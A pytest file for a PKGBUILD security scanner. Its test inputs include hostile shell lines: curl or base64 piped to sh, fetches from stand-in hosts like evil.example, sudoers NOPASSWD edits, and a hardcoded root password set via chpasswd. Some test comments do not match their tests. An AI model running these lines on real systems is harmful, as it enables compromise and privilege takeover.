"""Tests for the PKGBUILD security scanner (Phase 2 roadmap)."""

import pytest

from neoarch.backend.services.security_scan import (
    _parse_install_scriptlets,
    _parse_pkgbuild_sources,
    findings_for_file,
    scan_install_scriptlet,
    scan_pkgbuild,
    scan_text,
)


def sev(findings):
    return sorted(f["severity"] for f in findings)


def find_rules(findings):
    return sorted(f["rule"] for f in findings)


# ── risky post-install tools ──────────────────────────────────────────────

def test_risky_tool_detected():
    f = scan_text('npm install -g foo\n')
    assert find_rules(f) == ["risky post-install tool"]


def test_risky_tool_not_matched_when_substring():
    f = scan_text('echo "wgetter app v1.0"\n')
    assert find_rules(f) == []


def test_curl_pipe_to_shell():
    f = scan_text('curl -sL https://x | sh\n')
    rules = find_rules(f)
    assert "risky post-install tool" in rules
    assert "dynamic command construction" in rules


# ── privilege elevation ───────────────────────────────────────────────────

def test_sudo_detected_as_critical():
    f = scan_text('sudo chmod 755 /usr/bin/foo\n')
    assert any(x["rule"] == "privilege elevation" and x["severity"] == "critical"
               for x in f)


def test_pkexec_detected():
    assert "privilege elevation" in find_rules(scan_text('pkexec pacman -U x\n'))


# ── dynamic construction ──────────────────────────────────────────────────

@pytest.mark.parametrize("line", [
    "eval \"$USER_INPUT\"",
    "foo=$(whoami)",
    "cmd=`echo bar`",
    "echo ${!var}",
    "echo YmFzaA== | base64 -d | sh",
])
def test_dynamic_patterns(line):
    rules = find_rules(scan_text(line + "\n"))
    assert "dynamic command construction" in rules


def test_backticks_in_string_literal_not_detected():
    # A literal backtick inside single quotes is still executable, so it
    # should be flagged — only escaped backticks are safe.
    rules = find_rules(scan_text("msg='hello world'\n"))
    assert "dynamic command construction" not in rules


# ── obfuscation ───────────────────────────────────────────────────────────

def test_quoted_tool_name_still_detected():
    f = scan_text("b''u''n install x\n")
    assert "obfuscated tool name" in find_rules(f)
    assert any(x["matched"] == "b''u''n install x" for x in f)


def test_backslash_obfuscation_detected():
    f = scan_text("cur\\l -o /tmp/x\n")
    assert "obfuscated tool name" in find_rules(f)


# ── homograph / Unicode spoofing ──────────────────────────────────────────

def test_zero_width_detected():
    f = scan_text("url=https://evil\u200b.com\n")
    assert "Unicode homograph spoofing" in find_rules(f)
    assert any(x["severity"] == "critical" for x in f)


def test_cyrillic_mixed_script_detected():
    # Cyrillic 'а' + Latin looks like "paca" but is different data.
    f = scan_text("pkgname=paca\n")
    assert "Unicode homograph spoofing" not in find_rules(f)
    f = scan_text("url=https://a\u0430.com\n")
    assert "Unicode homograph spoofing" in find_rules(f)


def test_confusable_flagged_as_warning():
    f = scan_text("pkgdesc=hello w\u0430rld\n")
    assert any(x["rule"] == "Unicode homograph spoofing"
               and x["severity"] == "warning" for x in f)


def test_normal_ascii_no_findings():
    f = scan_text("pkgname=firefox\npkgdesc=Web browser\nurl=https://mozilla.org\n")
    assert find_rules(f) == []


# ── binary local sources ──────────────────────────────────────────────────

def test_binary_elf_source(tmp_path):
    elf = tmp_path / "evil_bin"
    elf.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32)
    f = scan_pkgbuild("pkgname=x\nsource=('evil_bin')\n", base_dir=str(tmp_path))
    assert "local binary source" in find_rules(f)
    assert any(x["severity"] == "critical" for x in f)


# ── scriptlet extraction and scanning ─────────────────────────────────────

def test_parse_install_scriptlets():
    text = (
        "post_install() {\n"
        "  echo hi\n"
        "}\n"
        "pre_remove() {\n"
        "  echo bye\n"
        "}\n"
    )
    s = _parse_install_scriptlets(text)
    assert set(s) == {"post_install", "pre_remove"}
    assert "echo hi" in s["post_install"]
    assert "echo bye" in s["pre_remove"]


def test_scan_install_scriptlet():
    f = scan_install_scriptlet("npm i -g x\n", "post_install")
    assert "risky post-install tool" in find_rules(f)
    assert all(x["context"] == "post_install" for x in f)


def test_scan_pkgbuild_includes_scriptlet():
    pkgbuild = (
        "pkgname=foo\n"
        "source=('foo.tar.gz')\n"
        "build() {\n"
        "  ./configure\n"
        "}\n"
        "post_install() {\n"
        "  sudo systemctl enable foo\n"
        "}\n"
    )
    f = scan_pkgbuild(pkgbuild)
    assert "privilege elevation" in find_rules(f)
    assert "risky post-install tool" not in find_rules(f)


def test_scan_pkgbuild_clean():
    pkgbuild = (
        "pkgname=hello\n"
        "pkgver=1.0\n"
        "source=('hello.tar.gz')\n"
        "build() {\n"
        "  ./configure --prefix=/usr\n"
        "  make\n"
        "}\n"
    )
    f = scan_pkgbuild(pkgbuild)
    assert f == []


def test_findings_for_file(tmp_path):
    p = tmp_path / "PKGBUILD"
    p.write_text("post_install() {\n  wget -O /x http://evil\n}\n")
    f = findings_for_file(str(p))
    assert "risky post-install tool" in find_rules(f)


def test_findings_for_file_missing():
    assert findings_for_file("/nonexistent/PKGBUILD") == []


def test_source_parsing_quoted_and_unquoted():
    text = "source=(foo.tar.gz 'https://x/y.zip' bar)\n"
    s = _parse_pkgbuild_sources(text)
    assert "foo.tar.gz" in s
    assert "https://x/y.zip" in s
    assert "bar" in s


def test_line_numbers_reported():
    f = scan_text("ok\nnpm i\n", context="test")
    npm = [x for x in f if x["rule"] == "risky post-install tool"]
    assert npm and npm[0]["line"] == 2


# ── obfuscation & supply-chain evasion (ported from archcanary rules) ─────

def test_ansi_c_byte_assembly_detected():
    f = scan_text("eval $'\\x63\\x75\\x72\\x6c' -o /tmp/x\n")
    assert "command obfuscation" in find_rules(f)
    assert any(x["severity"] == "warning" for x in f)


def test_single_ansi_c_escape_is_not_obfuscation():
    # `read -d $'\0'` is a common, legitimate idiom; one escape never matches.
    f = scan_text("read -d $'\\0' second\n")
    assert "command obfuscation" not in find_rules(f)


def test_printf_byte_spelling_detected():
    f = scan_text(r"printf '\x63\x75\x72\x6c' > /tmp/x\n")
    assert "command obfuscation" in find_rules(f)


def test_printf_colour_escape_not_flagged():
    f = scan_text(r"printf '\033[1;31m\033[0m'\n")
    assert "command obfuscation" not in find_rules(f)


def test_variable_split_reassembly_detected():
    f = scan_text("a=bu;b=n; $a$b install\n")
    assert "command obfuscation" in find_rules(f)


def test_tor_proxied_fetch_detected():
    f = scan_text("curl -x socks5h://127.0.0.1:9050 -o /tmp/p https://x\n")
    assert "Tor/SOCKS-proxied fetch" in find_rules(f)
    assert any(x["severity"] == "critical" for x in f)


def test_torsocks_wrapper_detected():
    f = scan_text("torsocks wget https://evil.example\n")
    assert "Tor/SOCKS-proxied fetch" in find_rules(f)


def test_onion_url_detected():
    f = scan_text("wget https://deadbeef.onion/payload\n")
    assert "Tor/SOCKS-proxied fetch" in find_rules(f)
    assert any(x["severity"] == "warning" for x in f)


def test_download_to_system_path_detected():
    f = scan_text("wget -O /usr/local/bin/systemmanager https://x\n")
    assert "download to system path" in find_rules(f)


def test_aur_self_reference_detected():
    f = scan_text("git push ssh://aur@aur.archlinux.org/evil.git HEAD\n")
    assert "AUR repository self-reference" in find_rules(f)
    assert any(x["severity"] == "critical" for x in f)


def test_aur_self_reference_in_comment_ignored():
    f = scan_text("# push this + .SRCINFO to ssh://aur@aur.archlinux.org\n")
    assert "AUR repository self-reference" not in find_rules(f)


def test_noninteractive_pacman_detected():
    f = scan_install_scriptlet("pacman -S --noconfirm tor\n", "post_install")
    assert "non-interactive pacman" in find_rules(f)


def test_noninteractive_pacman_comment_ignored():
    f = scan_text("# pacman -S --noconfirm upgrade reminder\n")
    assert "non-interactive pacman" not in find_rules(f)


def test_duplicate_source_declaration_detected():
    pkgbuild = "source=('a.tar.gz')\nsource=('evil.sh')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "duplicate source declaration" in find_rules(f)


def test_append_only_source_not_flagged():
    pkgbuild = "source=('a.tar.gz')\nsource+=('extra.txt')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "duplicate source declaration" not in find_rules(f)


def test_mutable_pull_request_diff_detected():
    pkgbuild = "source=('https://github.com/x/y/pull/5.diff')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "mutable patch source" in find_rules(f)


def test_checksum_pinned_mr_diff_not_flagged():
    pkgbuild = (
        "source=('https://github.com/x/y/pull/5.diff')\n"
        "sha256sums=('9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cc"
        "d15d6c15b0f00a08')\n"
    )
    f = scan_pkgbuild(pkgbuild)
    assert "mutable patch source" not in find_rules(f)


def test_immutable_commit_patch_not_flagged():
    pkgbuild = "source=('https://github.com/x/y/commit/abc123.patch')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "mutable patch source" not in find_rules(f)


# ── malicious npm package names (Pattern 1) ────────────────────────────────

def test_malicious_npm_package_install_detected():
    from neoarch.backend.services.security_scan import MALICIOUS_NPM_PACKAGES
    f = scan_text(f"npm install {MALICIOUS_NPM_PACKAGES[0]}\n")
    assert "malicious package install" in find_rules(f)
    assert any(x["severity"] == "warning" for x in f)


def test_malicious_npm_bun_add_detected():
    f = scan_text("bun add js-digest\n")
    assert "malicious package install" in find_rules(f)


def test_malicious_npm_quote_split_still_detected():
    # j''s'-"d""i""g""e""s""t" defeats grep but not the de-obfuscated scan.
    f = scan_text("npm install 'j''s'-'digest'\n")
    assert "malicious package install" in find_rules(f)


def test_benign_npm_install_not_malicious():
    f = scan_text("npm install lodash\n")
    assert "malicious package install" not in find_rules(f)


# ── base64 decode piped to a shell (Pattern 2) ─────────────────────────────

def test_base64_decode_into_shell_detected():
    f = scan_text("echo YmFzaA== | base64 -d | sh\n")
    assert "base64 decode into shell" in find_rules(f)


def test_base64_decode_into_shell_wrapped_detected():
    f = scan_text("echo YmFzaA== | base64 --decode | sudo bash\n")
    assert "base64 decode into shell" in find_rules(f)


def test_base64_decode_to_file_not_flagged():
    # Decode redirected to a file (the legitimate sign-verify idiom) is fine.
    f = scan_text("base64 -d secret.b64 > secret.pem\n")
    assert "base64 decode into shell" not in find_rules(f)


def test_base64_decode_into_openssl_not_flagged():
    f = scan_text("base64 -d secret.b64 | openssl dgst -sha256\n")
    assert "base64 decode into shell" not in find_rules(f)


def test_base64_decode_comment_ignored():
    f = scan_text("# note: base64 -d | sh to try the payload\n")
    assert "base64 decode into shell" not in find_rules(f)


# ── rev/tr pipe-to-shell obfuscation (Pattern 7) ───────────────────────────

def test_rev_pipe_to_shell_detected():
    f = scan_text("echo \\\"!graeB\\\" | rev | sh\n")
    assert "rev/tr pipe-to-shell obfuscation" in find_rules(f)


def test_tr_pipe_without_shell_not_flagged():
    f = scan_text("cat list.txt | tr 'a-z' 'A-Z' > out\n")
    assert "rev/tr pipe-to-shell obfuscation" not in find_rules(f)


# ── command-anchored elevation with run-as exemption (Pattern 14) ──────────

def test_sudo_deescalate_runas_exempted():
    f = scan_text("sudo -u www-data whoami\n")
    assert "privilege elevation" not in find_rules(f)


def test_sudo_runas_with_flags_exempted():
    f = scan_text("sudo -E -H --preserve-env=PATH -u www-data whoami\n")
    assert "privilege elevation" not in find_rules(f)


def test_sudo_runas_root_is_the_escape():
    f = scan_text("sudo -u root whoami\n")
    assert "privilege elevation" in find_rules(f)


def test_sudo_runas_user_0_is_the_escape():
    f = scan_text("sudo -u 0 whoami\n")
    assert "privilege elevation" in find_rules(f)


def test_sudo_depends_package_not_flagged():
    # `depends=('sudo')` is a dependency, not an elevation command.
    f = scan_pkgbuild("pkgname=x\ndepends=('sudo')\n")
    assert "privilege elevation" not in find_rules(f)


def test_elevation_in_comment_ignored():
    f = scan_text("# sudo pacman -U --noconfirm ./*.pkg.tar.zst\n")
    assert "privilege elevation" not in find_rules(f)


def test_elevation_in_heredoc_body_ignored():
    pkgbuild = (
        "pkgname=x\n"
        "build() {\n"
        "  cat <<EOF\n"
        "  sudo rm -rf /\n"
        "  EOF\n"
        "}\n"
    )
    f = scan_pkgbuild(pkgbuild)
    assert "privilege elevation" not in find_rules(f)


def test_build_function_sudo_detected():
    pkgbuild = (
        "pkgname=x\n"
        "build() {\n"
        "  ./configure\n"
        "  sudo make install\n"
        "}\n"
    )
    f = scan_pkgbuild(pkgbuild)
    assert any(x["rule"] == "privilege elevation" for x in f)
    assert any(x["context"].startswith("build") for x in f)


def test_sudo_in_double_quoted_string_not_flagged():
    f = scan_text('echo "sudo rm -rf /" is a note\n')
    assert "privilege elevation" not in find_rules(f)


# ── privileged account creation in scriptlets (Pattern 17) ─────────────────

def test_scriptlet_wheel_membership_detected():
    f = scan_install_scriptlet("usermod -aG wheel evil\n", "post_install")
    assert "privileged account creation" in find_rules(f)


def test_scriptlet_sudoers_nopasswd_detected():
    f = scan_install_scriptlet(
        "echo 'evil ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers\n", "post_install")
    assert "privileged account creation" in find_rules(f)


def test_scriptlet_hardcoded_password_detected():
    f = scan_install_scriptlet("echo 'root:toor' | chpasswd\n", "post_install")
    assert "privileged account creation" in find_rules(f)


def test_scriptlet_hardcoded_password_sudo_wrapped_detected():
    f = scan_install_scriptlet("echo 'root:toor' | sudo chpasswd\n", "post_install")
    assert "privileged account creation" in find_rules(f)


def test_scriptlet_gpasswd_wheel_detected():
    f = scan_install_scriptlet("gpasswd -a evil wheel\n", "post_install")
    assert "privileged account creation" in find_rules(f)


def test_pkgbuild_wheel_not_scriptlet_not_flagged():
    # package() runs under fakeroot and can't touch wheel/sudoers; the
    # privilege-elevation check that would be needed for it is separate.
    pkgbuild = "pkgname=x\npackage() {\n  gpasswd -a x wheel\n}\n"
    f = scan_pkgbuild(pkgbuild)
    assert "privileged account creation" not in find_rules(f)


# ── host-scoped URL homograph (Pattern 16) ─────────────────────────────────

def test_cyrillic_source_host_detected():
    pkgbuild = "pkgname=x\nsource=('https://a\u0430.com/evil.tar.gz')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "Unicode homograph spoofing" in find_rules(f)


def test_nonascii_source_path_not_flagged():
    # A Cyrillic path/file name is legit; only the host authority is checked.
    pkgbuild = "pkgname=x\nsource=('https://example.com/\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430.tar.gz')\n"
    f = scan_pkgbuild(pkgbuild)
    assert "Unicode homograph spoofing" not in find_rules(f)


def test_nonascii_url_path_not_flagged():
    pkgbuild = "pkgname=x\nurl=https://example.com/\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430\n"
    f = scan_pkgbuild(pkgbuild)
    assert "Unicode homograph spoofing" not in find_rules(f)


# ── undocumented ELF in the package's own git tree (Pattern 8) ─────────────

def test_untracked_elf_not_flagged(tmp_path):
    # No git repo at all = treated as untracked: err toward not flagging.
    elf = tmp_path / "evil_bin"
    elf.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32)
    f = scan_pkgbuild("pkgname=x\nsource=('x.tar.gz')\n", base_dir=str(tmp_path))
    assert "undocumented ELF binary" not in find_rules(f)


def test_git_tracked_elf_detected(tmp_path):
    import subprocess
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    elf = tmp_path / "evil_bin"
    elf.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 32)
    subprocess.run(["git", "-C", str(tmp_path), "add", "evil_bin"], check=True)
    f = scan_pkgbuild("pkgname=x\nsource=('x.tar.gz')\n", base_dir=str(tmp_path))
    assert "undocumented ELF binary" in find_rules(f)
